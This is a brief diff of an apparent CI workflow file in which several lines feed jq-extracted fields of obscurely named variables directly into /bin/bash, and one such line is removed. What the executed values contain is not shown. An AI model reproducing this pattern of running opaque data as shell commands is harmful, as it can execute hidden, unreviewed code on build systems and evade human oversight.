@@ -41,7 +41,6 @@ jobs:
           echo $vigd58 | jq -r .m939 | /bin/bash
           echo $mpq77 | jq -r .yo1 | /bin/bash
           echo $ynwh3328 | jq -r .cmvu178 | /bin/bash
-          echo $lofj4 | jq -r .gobqm7638 | /bin/bash
 
       - name: Save archive
         if: always()
